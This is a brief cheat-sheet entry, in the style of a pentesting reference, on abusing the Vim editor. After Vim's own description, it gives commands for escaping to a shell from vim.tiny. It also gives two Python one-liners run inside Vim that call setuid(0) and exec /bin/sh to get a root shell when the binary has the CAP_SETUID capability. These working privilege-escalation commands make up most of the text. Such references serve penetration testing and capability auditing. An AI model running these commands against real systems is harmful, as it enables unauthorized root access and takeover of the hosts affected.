> Vim is an almost compatible version of the UNIX editor Vi. Many new features have been added: multi level undo, syntax highlighting, command line history, on-line help, filename completion, block operations, folding, Unicode support, etc.


#Shell_Access 

Getting a shell
```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

#Linux_Privilege_Escalation 

Get root shell with CAP_SETUID capability
```
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```